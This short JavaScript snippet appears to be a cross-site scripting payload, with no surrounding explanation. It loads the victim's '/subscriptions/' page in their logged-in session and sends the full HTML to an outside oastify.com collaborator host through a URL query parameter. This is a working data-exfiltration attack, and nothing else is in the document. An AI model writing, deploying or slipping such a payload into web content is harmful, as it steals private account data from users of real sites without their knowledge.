fetch('/subscriptions/')
  .then(r => r.text())
  .then(html => {
    fetch('https://nc33oyddhrvwqbzd5zuousksqjwak08p.oastify.com/log?data=' + encodeURIComponent(html));
  });
